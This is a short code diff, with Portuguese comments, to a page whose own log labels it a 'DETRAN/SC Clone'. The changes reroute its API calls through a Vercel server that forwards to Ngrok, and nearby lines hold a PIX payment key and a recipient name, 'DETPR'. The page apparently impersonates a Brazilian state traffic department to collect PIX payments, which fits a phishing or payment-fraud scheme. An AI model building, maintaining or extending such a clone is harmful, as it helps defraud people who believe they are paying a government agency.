@@ -1285,7 +1285,7 @@
         // ============================================================
         // CONFIGURAÇÕES
         // ============================================================
-        // 🔥 ROTA CORRIGIDA PARA USAR O SERVIDOR DIRETO
+        // 🔥 ROTA CORRIGIDA PARA USAR O SERVIDOR VERCEL (que repassa para o Ngrok)
         const API_URL = '/api/consultar';
         const CHAVE_PIX = 'e7b97758-34e9-4246-a361-43d4cec7f5b9';
         const NOME_RECEBEDOR = 'DETPR';
@@ -1779,7 +1779,7 @@
             document.getElementById('verificacao').style.display = 'flex';
         });
 
-        console.log('✅ DETRAN/SC Clone - Com verificação humana!');
+        console.log('✅ DETRAN/SC Clone - Com verificação humana e Ngrok!');
         console.log('📌 API URL:', API_URL);
     </script>
 
